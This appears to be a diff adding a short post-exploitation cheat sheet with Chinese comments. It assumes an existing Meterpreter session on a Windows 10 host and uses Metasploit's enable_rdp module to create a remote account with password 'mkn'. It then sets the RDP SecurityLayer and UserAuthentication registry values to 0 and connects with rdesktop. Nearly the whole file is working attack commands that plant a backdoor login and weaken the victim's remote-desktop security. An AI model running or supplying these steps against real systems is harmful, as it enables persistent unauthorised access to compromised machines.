@@ -1,0 +1,14 @@
+//创建一个新用户来远程连接 win10 桌面,前提是已经渗透拿到meterpreter保存为session
+use post/windows/manage/enable_rdp
+set USERNAME mkn
+set PASSWORD mkn
+set session 1
+run
+//上述讲建立远程账号，下面将检查远程选项是否打开并设置为打开
+reg queryval -k HKLM\\SYSTEM\\ControlSet001\\Control\\"Terminal Server"\\WinStations\\RDP-Tcp -v SecurityLayer
+reg queryval -k HKLM\\SYSTEM\\ControlSet001\\Control\\"Terminal Server"\\WinStations\\RDP-Tcp -v UserAuthentication
+//接下来为设置成打开状态
+reg setval -k HKLM\\SYSTEM\\ControlSet001\\Control\\"Terminal Server"\\WinStations\\RDP-Tcp -v SecurityLayer -t REG_DWORD -d 0
+reg setval -k HKLM\\SYSTEM\\ControlSet001\\Control\\"Terminal Server"\\WinStations\\RDP-Tcp -v UserAuthentication -t REG_DWORD -d 0
+//接下来就可以通过凯丽进行远程登录操作
+rdesktop 192.168.1.3
